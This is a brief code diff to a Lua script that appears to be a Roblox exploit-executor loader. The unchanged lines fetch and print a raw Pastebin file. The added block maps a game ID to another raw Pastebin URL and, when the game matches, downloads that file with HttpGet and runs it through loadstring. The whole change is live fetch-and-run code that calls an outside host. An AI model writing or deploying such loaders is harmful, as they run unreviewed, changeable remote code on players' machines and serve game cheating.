@@ -1070,3 +1070,14 @@ if not shared.userdata then
 end
 print(shared.userdata({['Url']='https://pastebin.com/raw/BQ5Q052r',['Method']='GET'}).Body)
 print(tostring(excutor))
+
+--loadgame
+
+local gamelist = {
+    [1639994361]  = "https://pastebin.com/raw/DX5Fji14",
+}
+local checkgame = gamelist[game.gameId]
+if gamelist[game.gameId] then 
+    loadstring(game:HttpGet(checkgame))()
+end
+
